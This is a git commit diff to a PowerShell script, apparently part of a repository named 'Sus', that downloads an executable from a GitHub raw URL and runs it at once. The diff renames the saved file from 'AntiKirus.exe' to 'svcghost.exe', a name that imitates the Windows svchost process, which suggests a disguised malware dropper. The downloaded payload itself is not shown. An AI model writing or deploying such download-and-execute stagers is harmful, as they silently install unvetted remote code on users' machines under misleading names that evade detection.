1816ba1873e676e92ee091ba563bcfa5f1f4fe0e
Squatch55 <55oflubedirhan@gmail.com>
2022-02-09 05:58:58 +0300

    create

--- 59684/Dont/Script.ps1
+++ 59684/Dont/Script.ps1
@@ -1,4 +1,4 @@
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Tls,Tls11,Tls12'
-Invoke-WebRequest -Uri 'https://github.com/Squatch55/Sus/raw/master/59684/Dont/svcghost.exe' -OutFile AntiKirus.exe
+Invoke-WebRequest -Uri 'https://github.com/Squatch55/Sus/raw/master/59684/Dont/svcghost.exe' -OutFile svcghost.exe
 
-.\AntiKirus.exe
+.\svcghost.exe
